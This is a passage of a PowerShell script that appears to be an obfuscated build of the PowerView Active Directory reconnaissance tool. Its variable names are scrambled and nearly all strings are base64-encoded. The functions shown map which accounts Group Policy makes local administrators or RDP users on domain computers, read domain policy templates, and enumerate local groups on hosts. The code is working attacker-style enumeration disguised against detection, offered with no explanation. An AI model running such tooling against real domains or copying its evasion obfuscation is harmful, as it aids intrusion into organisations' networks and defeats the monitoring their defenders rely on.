                        ${/=\___/=\/=\__/\_} = New-Object PSObject
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${____/==\/\/=\/=\/}
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${__/===\/===\/\/==}
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${___/=\____/=\____}
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${____/\/=\/==\__/\}
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.Properties.distinguishedname
                        ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/=\/==\/\__/=\__/}
                        ${/=\___/=\/=\__/\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                        ${/=\___/=\/=\__/\_}
                    }
                }
            }
            __/=\_/=\_____/=\_ @/=\__/=\/\/\/=\/= -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAHQAZQBvAGIAagBlAGMAdABiAGwALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA'))) -__/\_/\_/\/=\/\/=\ ${__/===\/===\/\/==} | % {
                ForEach (${/=\_/==\__/==\/\_} in ${_/\/\/===\/\/\___}) {
                    $Object = ___/\___/\__/===\/ @/=\__/=\/\/\/=\/= -Identity ${/=\_/==\__/==\/\_} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                    ${____/==\/\/=\/=\/} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                    ${/=\___/=\/=\__/\_} = New-Object PSObject
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${____/==\/\/=\/=\/}
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${__/===\/===\/\/==}
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${___/=\____/=\____}
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${____/\/=\/==\__/\}
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
                    ${/=\___/=\/=\__/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $_.siteobjectbl
                    ${/=\___/=\/=\__/\_}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                    ${/=\___/=\/=\__/\_}
                }
            }
        }
    }
}
function Get-DomainGPOComputerLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${_____/=\/\/\/\/\/\},
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\__/=\/\/\/=\/=} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\__/=\/\/\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
            ${/=\/==\__/\/==\_/} = _/==\/\/\_______/\ @/=\__/=\/\/\/=\/= -Identity ${_____/=\/\/\/\/\/\} -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
            if (-not ${/=\/==\__/\/==\_/}) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAEMAbwBtAHAAdQB0AGUAcgBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcAXQAgAEMAbwBtAHAAdQB0AGUAcgAgACQAewBfAF8AXwBfAF8ALwA9AFwALwBcAC8AXAAvAFwALwBcAC8AXAB9ACAAbgBvAHQAIABmAG8AdQBuAGQALgAgAFQAcgB5ACAAYQAgAGYAdQBsAGwAeQAgAHEAdQBhAGwAaQBmAGkAZQBkACAAaABvAHMAdAAgAG4AYQBtAGUALgA=')))
            }
            ForEach (${__/\__/\/\_/=====} in ${/=\/==\__/\/==\_/}) {
                ${/=\___/====\__/\_} = @()
                ${______/=\/==\_/\_} = ${__/\__/\/\_/=====}.distinguishedname
                ${___/=\/=\/=\__/=\} = ${______/=\/==\_/\_}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))
                if (${___/=\/=\/=\__/=\} -gt 0) {
                    ${/=\/\_/\/=\_/\/==} = ${______/=\/==\_/\_}.SubString(${___/=\/=\/=\__/=\})
                }
                if (${/=\/\_/\/=\_/\/==}) {
                    ${/=\___/====\__/\_} += ___/\/==\_/=\/==== @/=\__/=\/\/\/=\/= -SearchBase ${/=\/\_/\/=\_/\/==} -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | % {
                        sls -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | % {$_.Matches | select -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $(${__/\__/\/\_/=====}.dnshostname)"
                ${___/\/\/\__/=\/\_} = (____/\/\_____/\_/= -____/=\/=\_/=\/\/ ${__/\__/\/\_/=====}.dnshostname).SiteName
                if (${___/\/\/\__/=\/\_} -and (${___/\/\/\__/=\/\_} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))))) {
                    ${/=\___/====\__/\_} += __/=\_/=\_____/=\_ @/=\__/=\/\/\/=\/= -Identity ${___/\/\/\__/=\/\_} -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | % {
                        sls -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | % {$_.Matches | select -ExpandProperty Value }
                    }
                }
                ${/=\___/====\__/\_} | _/==\___/\/\/==\__ @/=\__/=\/\/\/=\/= | sort -Property GPOName -Unique | % {
                    ${/===\_/=\___/\/\/} = $_
                    if(${/===\_/=\___/\/\/}.GroupMembers) {
                        ${_/==\___/\/=\____} = ${/===\_/=\___/\/\/}.GroupMembers
                    }
                    else {
                        ${_/==\___/\/=\____} = ${/===\_/=\___/\/\/}.GroupSID
                    }
                    ${_/==\___/\/=\____} | % {
                        $Object = ___/\___/\__/===\/ @/=\__/=\/\/\/=\/= -Identity $_
                        ${____/==\/\/=\/=\/} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                        ${__/\_/\/=\_/\/=\_} = New-Object PSObject
                        ${__/\_/\/=\_/\/=\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}.dnshostname
                        ${__/\_/\/=\_/\/=\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        ${__/\_/\/=\_/\/=\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        ${__/\_/\/=\_/\/=\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_
                        ${__/\_/\/=\_/\/=\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${____/==\/\/=\/=\/}
                        ${__/\_/\/=\_/\/=\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${/===\_/=\___/\/\/}.GPODisplayName
                        ${__/\_/\/=\_/\/=\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) ${/===\_/=\___/\/\/}.GPOName
                        ${__/\_/\/=\_/\/=\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${/===\_/=\___/\/\/}.GPOPath
                        ${__/\_/\/=\_/\/=\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) ${/===\_/=\___/\/\/}.GPOType
                        ${__/\_/\/=\_/\/=\_}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBDAG8AbQBwAHUAdABlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                        ${__/\_/\/=\_/\/=\_}
                    }
                }
            }
        }
    }
}
function Get-DomainPolicyData {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\/==\/=\___/===} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/==\/=\___/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/==\/=\___/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            ${_/\/==\/=\___/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        if ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))) {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = '*'
        }
        elseif ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAzADEAQgAyAEYAMwA0ADAALQAwADEANgBEAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        elseif (($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgA=')))) -or ($Policy -eq 'DC')) {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewA2AEEAQwAxADcAOAA2AEMALQAwADEANgBGAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        else {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Policy
        }
        ${_/===\/=\_/\/\___} = _/=\/\__/\/\/=\_/\ @/=\___/=\__/=\/\/
        ForEach (${/===\/\_/\__/==\/} in ${_/===\/=\_/\/\___}) {
            ${__/====\/\__/=\/=} = ${/===\/\_/\__/==\/}.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            ${_/\__/\_/\/\/\/\_} =  @{
                'GptTmplPath' = ${__/====\/\__/=\/=}
                'OutputObject' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\__/\_/\/\/\/\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            _/==\/\/\/\/\_/\/= @_/\__/\_/\/\/\/\_ | % {
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) ${/===\/\_/\__/==\/}.name
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${/===\/\_/\__/==\/}.displayname
                $_
            }
        }
    }
}
function Get-NetLocalGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = ${Env:____/=\/=\_/=\/\/},
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                ${___________/==\__} = 1
                ${/==\_/\_/\/==\___} = [IntPtr]::Zero
                ${_/==\/\__/\__/==\} = 0
                ${/\_____/\/\______} = 0
                ${/=\/\_____/\_/\_/} = 0
                ${/\_____/=\__/==\_} = ${_/=\/\/===\/\___/}::NetLocalGroupEnum(${__/\__/\/\_/=====}, ${___________/==\__}, [ref]${/==\_/\_/\/==\___}, -1, [ref]${_/==\/\__/\__/==\}, [ref]${/\_____/\/\______}, [ref]${/=\/\_____/\_/\_/})
                ${__/===\/=\/\__/\/=} = ${/==\_/\_/\/==\___}.ToInt64()
                if ((${/\_____/=\__/==\_} -eq 0) -and (${__/===\/=\/\__/\/=} -gt 0)) {
                    ${________/=\/\__/\} = ${__/\_/=======\_/=}::GetSize()
                    for (${/==\__/===\__/\__} = 0; (${/==\__/===\__/\__} -lt ${_/==\/\__/\__/==\}); ${/==\__/===\__/\__}++) {
                        ${/=\_/\/=\/\__/\/=} = New-Object System.Intptr -ArgumentList ${__/===\/=\/\__/\/=}
                        ${/=\__/\__/==\/===} = ${/=\_/\/=\/\__/\/=} -as ${__/\_/=======\_/=}
                        ${__/===\/=\/\__/\/=} = ${/=\_/\/=\/\__/\/=}.ToInt64()
                        ${__/===\/=\/\__/\/=} += ${________/=\/\__/\}
                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${/=\__/\__/==\/===}.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) ${/=\__/\__/==\/===}.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AQQBQAEkA'))))
                        $LocalGroup
                    }
                    $Null = ${_/=\/\/===\/\___/}::NetApiBufferFree(${/==\_/\_/\/==\___})
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] ${/\_____/=\__/==\_}).Message)"
                }
            }
            else {
                ${__/\__/\_/=\/=\/=} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewBfAF8ALwBcAF8AXwAvAFwALwBcAF8ALwA9AD0APQA9AD0AfQAsAGMAbwBtAHAAdQB0AGUAcgA=')))
                ${__/\__/\_/=\/=\/=}.psbase.children | ? { $_.psbase.schemaClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))) } | % {
                    $LocalGroup = ([ADSI]$_)
                    ${___/\__/\_/\_/\__} = New-Object PSObject
                    ${___/\__/\_/\_/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                    ${___/\__/\_/\_/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))))
                    ${___/\__/\_/\_/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))),0)).Value)
                    ${___/\__/\_/\_/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) ($LocalGroup.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))))
